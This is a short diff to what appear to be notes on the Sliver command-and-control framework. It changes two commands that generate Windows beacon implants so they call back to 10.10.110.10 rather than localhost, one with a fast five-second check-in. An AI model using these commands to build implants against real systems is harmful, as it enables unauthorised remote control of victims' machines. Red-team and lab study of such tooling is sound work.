@@ -108,10 +108,10 @@ sliver > armory install all
 There's a lot of factors. The below generates a beacon that is called 'http_beacon', is a windows executable, listens on 127.0.0.1 (default port 80)
 ```bash
 sliver > help generate beacon 
-sliver > generate beacon --http 127.0.0.1 --name httpbeacon80 --os windows
+sliver > generate beacon --http 10.10.110.10 --name httpbeacon80 --os windows
 
 # One with a low delay/jitter
-sliver > generate beacon --http 127.0.0.1 --name httpbeacon80fast --os windows --jitter 0 --seconds 5
+sliver > generate beacon --http 10.10.110.10 --name httpbeacon80fast --os windows --jitter 0 --seconds 5
 ```
 
 ## Setting up a Listener
